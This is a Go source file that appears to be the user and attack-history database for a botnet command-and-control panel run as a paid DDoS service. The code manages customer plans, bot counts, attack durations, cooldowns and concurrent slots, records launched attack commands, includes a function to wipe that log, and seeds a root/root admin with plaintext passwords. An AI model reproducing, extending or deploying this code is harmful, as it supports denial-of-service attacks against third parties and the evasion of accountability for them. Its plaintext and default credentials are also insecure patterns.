package main

import (
	"crypto/rand"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

type Database struct {
	path string
	mu   sync.RWMutex
	data *dbData
}

type dbData struct {
	Users          []UserRecord      `json:"users"`
	History        []HistoryRecord   `json:"history"`
	Whitelist      []WhitelistRecord `json:"whitelist"`
	NextUserID     int               `json:"next_user_id"`
	GlobalSlots    int               `json:"global_slots"`
	AttacksEnabled *bool             `json:"attacks_enabled"`
	ApiEnabled     *bool             `json:"api_enabled"`
}

type UserRecord struct {
	ID            int    `json:"id"`
	Username      string `json:"username"`
	Password      string `json:"password"`
	MaxBots       int    `json:"max_bots"`
	Admin         int    `json:"admin"`
	LastPaid      int64  `json:"last_paid"`
	Cooldown      int    `json:"cooldown"`
	DurationLimit uint32 `json:"duration_limit"`
	Online        int    `json:"online"`
	Wrc           int    `json:"wrc"`
	Intvl         int    `json:"intvl"`
	ApiKey        string `json:"api_key"`
	ApiAccess     bool   `json:"api_access"`
	MaxConcurrent int    `json:"max_concurrent"`
	Banned        bool   `json:"banned"`
	BanReason     string `json:"ban_reason"`
}

type HistoryRecord struct {
	UserID   int    `json:"user_id"`
	TimeSent int64  `json:"time_sent"`
	Duration uint32 `json:"duration"`
	Command  string `json:"command"`
	MaxBots  int    `json:"max_bots"`
}

type WhitelistRecord struct {
	Prefix  string `json:"prefix"`
	Netmask uint8  `json:"netmask"`
}

type AccountInfo struct {
	username      string
	maxBots       int
	admin         int
	maxConcurrent int
}

type CreateUserRequest struct {
	Username      string
	Password      string
	MaxBots       int
	Duration      int
	Cooldown      int
	Admin         bool
	MaxConcurrent int
	PlanDays      int
	ApiAccess     bool
}

func NewDatabase(path string) *Database {
	d := &Database{
		path: path,
		data: &dbData{
			Users:       make([]UserRecord, 0),
			History:     make([]HistoryRecord, 0),
			Whitelist:   make([]WhitelistRecord, 0),
			NextUserID:  1,
			GlobalSlots: 1,
		},
	}
	enabled := true
	d.data.AttacksEnabled = &enabled
	d.data.ApiEnabled = &enabled

	if err := d.load(); err != nil {
		if !os.IsNotExist(err) {
			fmt.Println("Error loading database.json:", err)
		}
		d.seedDefaultAdmin()
		if err := d.save(); err != nil {
			fmt.Println("Error creating database.json:", err)
		} else {
			fmt.Println("Created database.json with default admin (root/root)")
		}
	}

	d.resetOnlineFlags()
	fmt.Println("\r\n")
	fmt.Println("\x1b[38;5;99mStarting ur fucking botnet")
	return d
}

func (this *Database) load() error {
	raw, err := os.ReadFile(this.path)
	if err != nil {
		return err
	}
	var data dbData
	if err := json.Unmarshal(raw, &data); err != nil {
		return err
	}
	if data.Users == nil {
		data.Users = make([]UserRecord, 0)
	}
	if data.History == nil {
		data.History = make([]HistoryRecord, 0)
	}
	if data.Whitelist == nil {
		data.Whitelist = make([]WhitelistRecord, 0)
	}
	if data.NextUserID < 1 {
		maxID := 0
		for _, u := range data.Users {
			if u.ID > maxID {
				maxID = u.ID
			}
		}
		data.NextUserID = maxID + 1
	}
	if data.GlobalSlots < 1 {
		data.GlobalSlots = 1
	}
	if data.AttacksEnabled == nil {
		enabled := true
		data.AttacksEnabled = &enabled
	}
	if data.ApiEnabled == nil {
		enabled := true
		data.ApiEnabled = &enabled
	}
	this.data = &data
	return nil
}

func (this *Database) GetGlobalSlots() int {
	this.mu.RLock()
	defer this.mu.RUnlock()
	if this.data.GlobalSlots < 1 {
		return 1
	}
	return this.data.GlobalSlots
}

func (this *Database) SetGlobalSlots(value int) int {
	if value < 1 {
		value = 1
	}
	this.mu.Lock()
	defer this.mu.Unlock()
	this.data.GlobalSlots = value
	if err := this.save(); err != nil {
		fmt.Println("Error saving global slots:", err)
	}
	return this.data.GlobalSlots
}

func (this *Database) save() error {
	raw, err := json.MarshalIndent(this.data, "", "  ")
	if err != nil {
		return err
	}
	tmp := this.path + ".tmp"
	if err := os.WriteFile(tmp, raw, 0644); err != nil {
		return err
	}
	if err := os.Rename(tmp, this.path); err != nil {
		_ = os.Remove(this.path)
		if err := os.Rename(tmp, this.path); err != nil {
			_ = os.Remove(tmp)
			return os.WriteFile(this.path, raw, 0644)
		}
	}
	return nil
}

func (this *Database) seedDefaultAdmin() {
	enabled := true
	this.data.AttacksEnabled = &enabled
	this.data.ApiEnabled = &enabled
	this.data.Users = []UserRecord{{
		ID:            1,
		Username:      "root",
		Password:      "root",
		MaxBots:       -1,
		Admin:         1,
		LastPaid:      time.Now().Unix(),
		Cooldown:      0,
		DurationLimit: 0,
		Online:        0,
		Wrc:           0,
		Intvl:         0,
		ApiKey:        "",
		ApiAccess:     true,
		MaxConcurrent: -1,
	}}
	this.data.NextUserID = 2
}

func (this *Database) resetOnlineFlags() {
	this.mu.Lock()
	defer this.mu.Unlock()
	changed := false
	for i := range this.data.Users {
		if this.data.Users[i].Online != 0 {
			this.data.Users[i].Online = 0
			changed = true
		}
	}
	if changed {
		_ = this.save()
	}
}

func (this *Database) findUser(username string) *UserRecord {
	for i := range this.data.Users {
		if this.data.Users[i].Username == username {
			return &this.data.Users[i]
		}
	}
	return nil
}

func userStillValid(u *UserRecord) bool {
	if u.Wrc == 0 || u.Intvl == 0 {
		return true
	}
	return time.Now().Unix()-u.LastPaid < int64(u.Intvl)*24*60*60
}

func (this *Database) TryLogin(username string, password string) (bool, AccountInfo, string) {
	this.mu.Lock()
	defer this.mu.Unlock()

	u := this.findUser(username)
	if u == nil || u.Password != password {
		return false, AccountInfo{}, ""
	}
	if u.Banned {
		reason := u.BanReason
		if reason == "" {
			reason = "no reason given"
		}
		return false, AccountInfo{}, "You are banned: " + reason
	}
	if !userStillValid(u) {
		return false, AccountInfo{}, "Your plan has expired"
	}

	u.Online = 1
	accInfo := AccountInfo{u.Username, u.MaxBots, u.Admin, u.MaxConcurrent}
	if err := this.save(); err != nil {
		fmt.Println("Error saving login state:", err)
	}
	return true, accInfo, ""
}

func (this *Database) Logout(username string) {
	this.mu.Lock()
	defer this.mu.Unlock()

	u := this.findUser(username)
	if u == nil {
		return
	}
	u.Online = 0
	if err := this.save(); err != nil {
		fmt.Println("Error setting user offline:", err)
	}
}

func (this *Database) GetOnlineCount() (int, error) {
	this.mu.RLock()
	defer this.mu.RUnlock()

	count := 0
	for _, u := range this.data.Users {
		if u.Online != 0 {
			count++
		}
	}
	return count, nil
}

func (this *Database) ChangePass(username string, newPassword string) bool {
	if newPassword == "" {
		return false
	}
	this.mu.Lock()
	defer this.mu.Unlock()

	u := this.findUser(username)
	if u == nil {
		return false
	}
	u.Password = newPassword
	return this.save() == nil
}

func (this *Database) CreateUser(username string, password string, max_bots int, duration int, cooldown int) bool {
	return this.CreateAccount(CreateUserRequest{
		Username:      username,
		Password:      password,
		MaxBots:       max_bots,
		Duration:      duration,
		Cooldown:      cooldown,
		Admin:         false,
		MaxConcurrent: 1,
		PlanDays:      0,
	}) == nil
}

func (this *Database) createAdmin(username string, password string, max_bots int, duration int, cooldown int) bool {
	return this.CreateAccount(CreateUserRequest{
		Username:      username,
		Password:      password,
		MaxBots:       max_bots,
		Duration:      duration,
		Cooldown:      cooldown,
		Admin:         true,
		MaxConcurrent: -1,
		PlanDays:      0,
	}) == nil
}

func (this *Database) CreateAccount(req CreateUserRequest) error {
	this.mu.Lock()
	defer this.mu.Unlock()

	if strings.TrimSpace(req.Username) == "" || req.Password == "" {
		return errors.New("username and password cannot be empty")
	}
	if this.findUser(req.Username) != nil {
		return errors.New("user already exists")
	}

	admin := 0
	if req.Admin {
		admin = 1
	}
	wrc, intvl := 0, 0
	if req.PlanDays > 0 {
		wrc = 1
		intvl = req.PlanDays
	}
	maxConc := req.MaxConcurrent
	if maxConc == 0 {
		maxConc = 1
	}

	this.data.Users = append(this.data.Users, UserRecord{
		ID:            this.data.NextUserID,
		Username:      req.Username,
		Password:      req.Password,
		MaxBots:       req.MaxBots,
		Admin:         admin,
		LastPaid:      time.Now().Unix(),
		Cooldown:      req.Cooldown,
		DurationLimit: uint32(req.Duration),
		Online:        0,
		Wrc:           wrc,
		Intvl:         intvl,
		ApiKey:        "",
		ApiAccess:     req.ApiAccess,
		MaxConcurrent: maxConc,
	})
	this.data.NextUserID++
	if err := this.save(); err != nil {
		this.data.Users = this.data.Users[:len(this.data.Users)-1]
		this.data.NextUserID--
		return err
	}
	return nil
}

func (this *Database) GetUser(username string) (UserRecord, bool) {
	this.mu.RLock()
	defer this.mu.RUnlock()
	u := this.findUser(username)
	if u == nil {
		return UserRecord{}, false
	}
	return *u, true
}

func (this *Database) ListUsers() []UserRecord {
	this.mu.RLock()
	defer this.mu.RUnlock()
	out := make([]UserRecord, len(this.data.Users))
	copy(out, this.data.Users)
	return out
}

func (this *Database) GetUserID(username string) int {
	this.mu.RLock()
	defer this.mu.RUnlock()
	u := this.findUser(username)
	if u == nil {
		return -1
	}
	return u.ID
}

func (this *Database) UsernameByID(id int) string {
	this.mu.RLock()
	defer this.mu.RUnlock()
	for _, u := range this.data.Users {
		if u.ID == id {
			return u.Username
		}
	}
	return ""
}

func (this *Database) ListRunningHistory() []HistoryRecord {
	this.mu.RLock()
	defer this.mu.RUnlock()
	now := time.Now().Unix()
	out := make([]HistoryRecord, 0)
	for _, h := range this.data.History {
		if h.TimeSent+int64(h.Duration) > now {
			out = append(out, h)
		}
	}
	return out
}

func (this *Database) ListHistoryForUser(username string) []HistoryRecord {
	this.mu.RLock()
	defer this.mu.RUnlock()
	u := this.findUser(username)
	if u == nil {
		return nil
	}
	out := make([]HistoryRecord, 0)
	for _, h := range this.data.History {
		if h.UserID == u.ID {
			out = append(out, h)
		}
	}
	return out
}

func (this *Database) fetchAttacks() int {
	this.mu.RLock()
	defer this.mu.RUnlock()
	return len(this.data.History)
}

func (this *Database) fetchUsers() int {
	this.mu.RLock()
	defer this.mu.RUnlock()
	return len(this.data.Users)
}

func (this *Database) fetchRunningAttacks() int {
	this.mu.RLock()
	defer this.mu.RUnlock()
	return this.countRunning(-1)
}

func (this *Database) fetchUserRunningAttacks(username string) int {
	this.mu.RLock()
	defer this.mu.RUnlock()
	u := this.findUser(username)
	if u == nil {
		return 0
	}
	return this.countRunning(u.ID)
}

func (this *Database) countRunning(userID int) int {
	now := time.Now().Unix()
	count := 0
	for _, h := range this.data.History {
		if userID != -1 && h.UserID != userID {
			continue
		}
		if h.TimeSent+int64(h.Duration) > now {
			count++
		}
	}
	return count
}

func (this *Database) removeUser(username string) bool {
	this.mu.Lock()
	defer this.mu.Unlock()

	for i, u := range this.data.Users {
		if u.Username == username {
			this.data.Users = append(this.data.Users[:i], this.data.Users[i+1:]...)
			if err := this.save(); err != nil {
				fmt.Println(err)
				return false
			}
			return true
		}
	}
	return false
}

func (this *Database) BanUser(username, reason string) error {
	this.mu.Lock()
	defer this.mu.Unlock()

	u := this.findUser(username)
	if u == nil {
		return errors.New("user not found")
	}
	if u.Banned {
		return errors.New("user is already banned")
	}
	u.Banned = true
	u.BanReason = reason
	u.Online = 0
	return this.save()
}

func (this *Database) EditUser(username, field, op, value string) error {
	this.mu.Lock()
	defer this.mu.Unlock()

	u := this.findUser(username)
	if u == nil {
		return errors.New("user not found")
	}

	field = strings.ToLower(field)
	op = strings.ToLower(op)

	switch field {
	case "maxtime", "duration":
		if err := applyIntOp(&u.DurationLimit, op, value); err != nil {
			return err
		}
	case "cooldown":
		var v int
		if err := applyIntOpInt(&v, op, value); err != nil {
			return err
		}
		if op == "set" {
			u.Cooldown = v
		} else if op == "add" {
			u.Cooldown += v
		} else if op == "remove" {
			u.Cooldown -= v
			if u.Cooldown < 0 {
				u.Cooldown = 0
			}
		} else {
			return errors.New("use add, remove or set")
		}
	case "days", "plan":
		if err := applyDaysOp(u, op, value); err != nil {
			return err
		}
	case "api":
		if op == "true" || op == "set" && (value == "true" || value == "1") {
			u.ApiAccess = true
		} else if op == "false" || op == "set" && (value == "false" || value == "0") {
			u.ApiAccess = false
		} else {
			return errors.New("use true or false")
		}
	case "apikey":
		if op == "remove" {
			u.ApiKey = ""
		} else if op == "set" {
			if value == "" {
				key, err := randomApiKey()
				if err != nil {
					return err
				}
				u.ApiKey = key
			} else {
				u.ApiKey = value
			}
		} else {
			return errors.New("use set or remove for apikey")
		}
	case "botcount", "bots", "maxbots":
		var v int
		if err := applyIntOpInt(&v, op, value); err != nil {
			return err
		}
		if op == "set" {
			u.MaxBots = v
		} else if op == "add" {
			if u.MaxBots != -1 {
				u.MaxBots += v
			}
		} else if op == "remove" {
			if u.MaxBots != -1 {
				u.MaxBots -= v
			}
		} else {
			return errors.New("use add, remove or set")
		}
	case "admin":
		if op == "true" || op == "set" && (value == "true" || value == "1") {
			u.Admin = 1
		} else if op == "false" || op == "set" && (value == "false" || value == "0") {
			u.Admin = 0
		} else {
			return errors.New("use true or false")
		}
	case "password", "pass":
		if op != "set" {
			return errors.New("use set for password")
		}
		if value == "" {
			return errors.New("password cannot be empty")
		}
		u.Password = value
	case "con", "conc", "cons", "concurrent", "slots":
		var v int
		if err := applyIntOpInt(&v, op, value); err != nil {
			return err
		}
		if op == "set" {
			u.MaxConcurrent = v
		} else if op == "add" {
			if u.MaxConcurrent != -1 {
				u.MaxConcurrent += v
			}
		} else if op == "remove" {
			if u.MaxConcurrent != -1 {
				u.MaxConcurrent -= v
				if u.MaxConcurrent < 0 {
					u.MaxConcurrent = 0
				}
			}
		} else {
			return errors.New("use add, remove or set")
		}
	default:
		return errors.New("unknown field (maxtime|cooldown|days|api|botcount|conc|cons|con|concurrent|slots|admin|password)")
	}

	return this.save()
}

func applyDaysOp(u *UserRecord, op, value string) error {
	if op != "set" && op != "add" && op != "remove" {
		return errors.New("use add, remove or set")
	}
	if op == "remove" && strings.TrimSpace(value) == "" {
		u.Wrc = 0
		u.Intvl = 0
		return nil
	}
	n, err := strconv.Atoi(value)
	if err != nil {
		return errors.New("invalid day value")
	}
	switch op {
	case "set":
		if n <= 0 {
			u.Wrc = 0
			u.Intvl = 0
		} else {
			u.Wrc = 1
			u.Intvl = n
			u.LastPaid = time.Now().Unix()
		}
	case "add":
		if u.Wrc == 0 || u.Intvl == 0 {
			u.Wrc = 1
			u.Intvl = n
			u.LastPaid = time.Now().Unix()
		} else {
			u.Intvl += n
		}
	case "remove":
		if u.Wrc != 0 {
			u.Intvl -= n
			if u.Intvl <= 0 {
				u.Wrc = 0
				u.Intvl = 0
			}
		}
	}
	return nil
}

func applyIntOp(dst *uint32, op, value string) error {
	n, err := strconv.Atoi(value)
	if err != nil {
		return errors.New("invalid number")
	}
	switch op {
	case "set":
		*dst = uint32(n)
	case "add":
		*dst += uint32(n)
	case "remove":
		if uint32(n) >= *dst {
			*dst = 0
		} else {
			*dst -= uint32(n)
		}
	default:
		return errors.New("use add, remove or set")
	}
	return nil
}

func applyIntOpInt(dst *int, op, value string) error {
	n, err := strconv.Atoi(value)
	if err != nil {
		return errors.New("invalid number")
	}
	if op != "set" && op != "add" && op != "remove" {
		return errors.New("use add, remove or set")
	}
	*dst = n
	return nil
}

func randomApiKey() (string, error) {
	b := make([]byte, 16)
	if _, err := rand.Read(b); err != nil {
		return "", err
	}
	return hex.EncodeToString(b), nil
}

func (this *Database) CleanLogs() bool {
	this.mu.Lock()
	defer this.mu.Unlock()

	this.data.History = this.data.History[:0]
	if err := this.save(); err != nil {
		fmt.Println(err)
		return false
	}
	return true
}

func (this *Database) AttacksEnabled() bool {
	this.mu.RLock()
	defer this.mu.RUnlock()
	if this.data.AttacksEnabled == nil {
		return true
	}
	return *this.data.AttacksEnabled
}

func (this *Database) SetAttacksEnabled(enabled bool) error {
	this.mu.Lock()
	defer this.mu.Unlock()
	this.data.AttacksEnabled = &enabled
	return this.save()
}

func (this *Database) ApiEnabled() bool {
	this.mu.RLock()
	defer this.mu.RUnlock()
	if this.data.ApiEnabled == nil {
		return true
	}
	return *this.data.ApiEnabled
}

func (this *Database) SetApiEnabled(enabled bool) error {
	this.mu.Lock()
	defer this.mu.Unlock()
	this.data.ApiEnabled = &enabled
	return this.save()
}

func (this *Database) AuthApi(username, password string) (AccountInfo, error) {
	this.mu.RLock()
	defer this.mu.RUnlock()

	if this.data.ApiEnabled != nil && !*this.data.ApiEnabled {
		return AccountInfo{}, errors.New("API is currently disabled")
	}

	u := this.findUser(username)
	if u == nil || u.Password != password {
		return AccountInfo{}, errors.New("invalid credentials")
	}
	if u.Banned {
		return AccountInfo{}, errors.New("account is banned")
	}
	if !userStillValid(u) {
		return AccountInfo{}, errors.New("plan has expired")
	}
	if !u.ApiAccess {
		return AccountInfo{}, errors.New("API access is disabled for this user")
	}
	return AccountInfo{u.Username, u.MaxBots, u.Admin, u.MaxConcurrent}, nil
}

func (this *Database) fetchUserAttackCount(username string) int {
	this.mu.RLock()
	defer this.mu.RUnlock()
	u := this.findUser(username)
	if u == nil {
		return 0
	}
	n := 0
	for _, h := range this.data.History {
		if h.UserID == u.ID {
			n++
		}
	}
	return n
}

func (this *Database) ContainsWhitelistedTargets(attack *Attack) bool {
	this.mu.RLock()
	defer this.mu.RUnlock()

	for _, w := range this.data.Whitelist {
		ip := net.ParseIP(w.Prefix)
		if ip == nil {
			continue
		}
		ip = ip.To4()
		if ip == nil {
			continue
		}
		iWhitelistPrefix := binary.BigEndian.Uint32(ip)

		for aPNetworkOrder, aN := range attack.Targets {
			rvBuf := make([]byte, 4)
			binary.BigEndian.PutUint32(rvBuf, aPNetworkOrder)
			iAttackPrefix := binary.BigEndian.Uint32(rvBuf)
			if aN > w.Netmask {
				if netshift(iWhitelistPrefix, w.Netmask) == netshift(iAttackPrefix, w.Netmask) {
					return true
				}
			} else if aN < w.Netmask {
				if (iAttackPrefix >> aN) == (iWhitelistPrefix >> aN) {
					return true
				}
			} else if iWhitelistPrefix == iAttackPrefix {
				return true
			}
		}
	}
	return false
}

func (this *Database) CanLaunchAttack(username string, duration uint32, fullCommand string, maxBots int, allowConcurrent int) (bool, error) {
	this.mu.Lock()
	defer this.mu.Unlock()

	if this.data.AttacksEnabled != nil && !*this.data.AttacksEnabled {
		return false, errors.New("Attacks are currently disabled")
	}

	u := this.findUser(username)
	if u == nil {
		return false, errors.New("Your access has been terminated")
	}
	if u.Banned {
		return false, errors.New("You are banned")
	}

	if u.DurationLimit != 0 && duration > u.DurationLimit {
		return false, errors.New(fmt.Sprintf("Your max attack time is %d seconds.", u.DurationLimit))
	}

	now := time.Now().Unix()
	userRunning := 0
	globalRunning := 0
	for _, h := range this.data.History {
		if h.TimeSent+int64(h.Duration) <= now {
			continue
		}
		globalRunning++
		if h.UserID == u.ID {
			userRunning++
		}
	}

	globalMax := this.data.GlobalSlots
	if globalMax < 1 {
		globalMax = 1
	}
	if globalMax > 0 && globalRunning >= globalMax {
		return false, errors.New("Global concurrent attacks reached")
	}

	maxConc := u.MaxConcurrent
	if maxConc == 0 {
		maxConc = 1
	}
	if maxConc != -1 && userRunning >= maxConc {
		return false, errors.New("Max concurrent attacks reached")
	}

	if u.Admin == 0 {
		for _, h := range this.data.History {
			if h.UserID == u.ID && h.TimeSent+int64(h.Duration)+int64(u.Cooldown) > now {
				wait := (h.TimeSent + int64(h.Duration) + int64(u.Cooldown)) - now
				return false, errors.New(fmt.Sprintf("Please wait %d seconds before sending another attack", wait))
			}
		}
	}

	this.data.History = append(this.data.History, HistoryRecord{
		UserID:   u.ID,
		TimeSent: now,
		Duration: duration,
		Command:  fullCommand,
		MaxBots:  maxBots,
	})
	if err := this.save(); err != nil {
		fmt.Println(err)
		this.data.History = this.data.History[:len(this.data.History)-1]
		return false, err
	}
	return true, nil
}

func (this *Database) CheckApiCode(apikey string) (bool, AccountInfo) {
	this.mu.RLock()
	defer this.mu.RUnlock()

	if apikey == "" {
		return false, AccountInfo{}
	}
	for _, u := range this.data.Users {
		if u.ApiKey == apikey {
			if u.Banned {
				return false, AccountInfo{}
			}
			return true, AccountInfo{u.Username, u.MaxBots, u.Admin, u.MaxConcurrent}
		}
	}
	return false, AccountInfo{}
}

func planLabel(u UserRecord) string {
	if u.Wrc == 0 || u.Intvl == 0 {
		return "unlimited"
	}
	expiry := u.LastPaid + int64(u.Intvl)*24*60*60
	left := expiry - time.Now().Unix()
	if left <= 0 {
		return "expired"
	}
	days := left / (24 * 60 * 60)
	if left%(24*60*60) != 0 {
		days++
	}
	return fmt.Sprintf("%dd", days)
}
